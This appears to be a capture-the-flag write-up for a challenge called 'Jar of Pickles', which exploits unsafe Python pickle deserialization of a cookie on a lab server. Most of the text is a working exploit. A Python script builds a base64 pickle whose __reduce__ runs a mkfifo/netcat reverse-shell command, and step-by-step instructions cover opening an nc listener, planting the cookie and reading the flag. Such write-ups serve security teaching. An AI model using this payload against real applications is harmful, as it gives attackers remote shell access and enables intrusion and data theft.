# Name: Jar of Pickles

## Vulnerability

Unsafe usafe of Python3 pickle module.

## Exploit

Click on the picture, it will take you to 141.85.224.101:8007/jar.
Notice the `pickled` cookie.

Use `nc -nvlk 1234` to open a connection to your machine first.
Run this program that prints the encoded pickled object of this class that spawns a shell (change the IP to yours).

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode("utf-8"))
```

Take the output and set it as the Cookie value.
Make the request again.
You should have a shell now, perform a `cat` on the flag file.

Exploit in `../sol/solution.sh`.
